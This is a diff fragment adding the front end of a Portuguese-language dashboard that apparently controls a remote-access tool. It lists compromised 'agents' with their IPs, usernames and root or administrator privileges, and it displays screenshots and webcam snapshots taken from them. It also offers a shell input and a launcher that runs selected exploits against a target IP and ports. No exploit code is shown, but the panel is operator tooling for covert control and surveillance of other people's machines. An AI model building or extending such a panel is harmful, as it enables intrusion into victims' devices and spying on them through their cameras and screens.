+    if (!selectedExploits.size) { notyf.error('Selecione ao menos um exploit.'); return; }
+    if (!target)                { notyf.error('Informe o IP do alvo.'); return; }
+
+    let ports = [];
+    if (portsInput) {
+        ports = portsInput.split(',').map(p => parseInt(p.trim())).filter(n => n > 0 && n < 65536);
+    }
+
+    isExploiting = true;
+    currentRunId = `run-${Date.now()}`;
+    updateExploitRunBtn();
+    document.getElementById('run-exploit-btn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> Executando...';
+    setTermStatus('running');
+    navigateTo('terminal');
+    clearExploitTerminal();
+    appendExploitLog(`Alvo: ${target} | Exploits: ${[...selectedExploits].map(f=>f.replace('.py','')).join(', ')}`, 'log-step');
+    appendExploitLog(`Portas: ${ports.length ? ports.join(', ') : 'padrão'} | Modo: ${exploitMode}`, 'log-info');
+
+    fetch('/api/exploits/run', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ exploits:[...selectedExploits], target_ip:target, ports, mode:exploitMode, run_id:currentRunId })
+    })
+    .then(r => r.json())
+    .then(d => {
+        if (d.status !== 'started') {
+            appendExploitLog(`Erro: ${d.message}`, 'log-err');
+            resetExploitState();
+        }
+    })
+    .catch(err => {
+        appendExploitLog(`Falha: ${err}`, 'log-err');
+        resetExploitState();
+    });
+}
+
+function resetExploitState() {
+    isExploiting = false;
+    updateExploitRunBtn();
+    document.getElementById('run-exploit-btn').innerHTML = '<i class="fas fa-crosshairs"></i> Executar';
+    setTermStatus('fail');
+}
+
+// ── Exploit Terminal ──────────────────────────────────────────────────────────
+function appendExploitLog(msg, cls = 'log-info') {
+    const t = document.getElementById('exploit-terminal');
+    t.querySelector('.t-empty')?.remove();
+    const now  = new Date().toLocaleTimeString('pt-BR', { hour12: false });
+    const line = document.createElement('div');
+    line.style.cssText = 'margin-bottom:1px;white-space:pre-wrap;word-break:break-all';
+    line.innerHTML = `<span class="log-time">${now}</span><span class="${cls}">${escHtml(msg)}</span>`;
+    t.appendChild(line);
+    t.scrollTop = t.scrollHeight;
+    // Badge de notificação se não estiver na aba terminal
+    if (document.querySelector('.page.active')?.id !== 'page-terminal') {
+        document.getElementById('term-badge').style.display = '';
+    }
+}
+
+function clearExploitTerminal() {
+    document.getElementById('exploit-terminal').innerHTML =
+        '<div class="t-empty"><i class="fas fa-terminal" style="font-size:1.5rem;display:block;margin-bottom:8px;opacity:.4"></i>Terminal limpo.</div>';
+}
+
+function setTermStatus(state) {
+    const dot   = document.getElementById('term-dot');
+    const label = document.getElementById('term-label');
+    const map   = { idle:['','Aguardando'], running:['running','Executando...'], ok:['ok','Concluído'], fail:['fail','Falhou'] };
+    dot.className      = `term-dot ${map[state][0]}`;
+    label.textContent  = map[state][1];
+}
+
+function escHtml(s) {
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ── Agents Rendering — BUG FIX: null check em os_name ────────────────────────
+function renderAgentsList() {
+    const list       = document.getElementById('agents-list');
+    const searchTerm = document.getElementById('agent-search').value.toLowerCase();
+
+    const agents = Object.values(agentsData).filter(a =>
+        Object.values(a).some(v => String(v).toLowerCase().includes(searchTerm))
+    ).sort((a, b) => {
+        if (a.status !== b.status) return a.status === 'online' ? -1 : 1;
+        return new Date(b.last_seen) - new Date(a.last_seen);
+    });
+
+    const online = agents.filter(a => a.status === 'online').length;
+    document.getElementById('online-badge').textContent = `${online} online`;
+
+    if (!agents.length) {
+        list.innerHTML = '<div class="empty-state"><i class="fas fa-satellite-dish"></i><p>Nenhum agente encontrado.</p></div>';
+        return;
+    }
+
+    list.innerHTML = agents.map(agent => {
+        const isOnline = agent.status === 'online';
+        // BUG FIX: usa variável local já com null-safe toLowerCase()
+        const osName = (agent.os_name || '').toLowerCase();
+        let osIcon;
+        if      (osName.includes('windows'))  osIcon = 'fab fa-windows" style="color:#60a5fa';
+        else if (osName.includes('linux'))    osIcon = 'fab fa-linux" style="color:#fcd34d';
+        else if (osName.includes('android'))  osIcon = 'fab fa-android" style="color:#4ade80';
+        else                                  osIcon = 'fas fa-question-circle';
+
+        const timeAgo    = formatTimeAgo(new Date(agent.last_seen));
+        const privColor  = (agent.privileges === 'Root' || agent.privileges === 'Administrador')
+            ? 'color:var(--red)' : 'color:var(--gray)';
+
+        return `
+            <div class="agent-card ${isOnline ? 'online' : 'offline'} ${selectedAgentId === agent.id ? 'selected' : ''}"
+                 data-id="${agent.id}" onclick="openSheet('${agent.id}')">
+                <div class="agent-row1">
+                    <span class="agent-hostname">${agent.hostname}</span>
+                    <div class="agent-status">
+                        <div class="sdot ${isOnline ? 'online' : 'offline'}"></div>
+                        <span class="status-text ${isOnline ? 'online' : 'offline'}">${isOnline ? 'Online' : 'Offline'}</span>
+                    </div>
+                </div>
+                <div class="agent-row2">
+                    <div class="agent-meta">
+                        <i class="fas fa-network-wired"></i>
+                        <span style="font-family:var(--mono);font-size:0.68rem">${agent.internal_ip || 'N/A'}</span>
+                    </div>
+                    <div class="agent-meta">
+                        <i class="${osIcon}"></i>
+                        <span>${agent.os_name || '—'}</span>
+                    </div>
+                </div>
+                <div class="agent-row3">
+                    <span class="agent-sub"><i class="fas fa-user"></i>${agent.username}</span>
+                    <span class="agent-sub" style="${privColor}"><i class="fas fa-shield-alt"></i>${agent.privileges || '—'}</span>
+                    <span class="agent-sub"><i class="fas fa-clock"></i>${timeAgo}</span>
+                </div>
+            </div>`;
+    }).join('');
+}
+
+function formatTimeAgo(date) {
+    if (!date || isNaN(date)) return 'Nunca';
+    const sec = Math.floor((new Date() - date) / 1000);
+    if (sec < 5)   return 'Agora';
+    if (sec < 60)  return `${sec}s atrás`;
+    const min = Math.floor(sec / 60);
+    if (min < 60)  return `${min}m atrás`;
+    const h = Math.floor(min / 60);
+    if (h < 24)    return `${h}h atrás`;
+    return `${Math.floor(h/24)}d atrás`;
+}
+
+function vibrate(ms = 40) { if (navigator.vibrate) navigator.vibrate(ms); }
+
+// ── WebSocket ─────────────────────────────────────────────────────────────────
+const socket = io({ transports: ['websocket'] });
+
+socket.on('connect', () => {
+    const b = document.getElementById('ws-badge');
+    b.textContent = 'Online'; b.className = 'ws-badge online';
+    socket.emit('request_initial_data');
+});
+socket.on('disconnect', () => {
+    const b = document.getElementById('ws-badge');
+    b.textContent = 'Offline'; b.className = 'ws-badge offline';
+});
+
+let prevCount = 0;
+socket.on('agent_list_update', data => {
+    const newCount = Object.keys(data).length;
+    if (prevCount > 0 && newCount > prevCount) { notyf.success('Novo agente conectado!'); vibrate(80); }
+    prevCount  = newCount;
+    agentsData = data;
+    renderAgentsList();
+});
+
+socket.on('new_result', result => {
+    if (result.agent_id !== selectedAgentId) return;
+    const box = document.getElementById('results-box');
+    if (['screenshot_result','webcam_snap_result'].includes(result.data_type)) {
+        showImageModal(result.data);
+        box.textContent = 'Imagem recebida — aberta em modal.';
+    } else {
+        box.textContent = typeof result.data === 'object'
+            ? JSON.stringify(result.data, null, 2)
+            : String(result.data);
+        box.scrollTop = box.scrollHeight;
+    }
+});
+
+socket.on('exploit_log', data => {
+    if (data.run_id !== currentRunId) return;
+    const cls = {info:'log-info',success:'log-ok',error:'log-err',warn:'log-warn',step:'log-step',vuln:'log-vuln'}[data.level] || 'log-info';
+    appendExploitLog(data.message, cls);
+});
+
+socket.on('exploit_finished', data => {
+    if (data.run_id !== currentRunId) return;
+    currentRunId = null;
+    resetExploitState();
+    setTermStatus(data.success_count > 0 ? 'ok' : 'fail');
+    const msg = `${data.success_count}/${data.total_jobs} jobs bem-sucedidos`;
+    appendExploitLog(`=== CONCLUÍDO: ${msg} ===`, data.success_count > 0 ? 'log-ok' : 'log-err');
+    notyf[data.success_count > 0 ? 'success' : 'error'](msg);
+    vibrate(data.success_count > 0 ? [50,50,50] : 200);
+});
+
+// ── Init ──────────────────────────────────────────────────────────────────────
+document.getElementById('agent-search').addEventListener('input', renderAgentsList);
+document.getElementById('shell-input').addEventListener('keyup', e => e.key === 'Enter' && issueShell());
+loadExploits();
+setInterval(() => { if (!isExploiting) loadExploits(); }, 30000);
+</script>
+</body>
+</html>
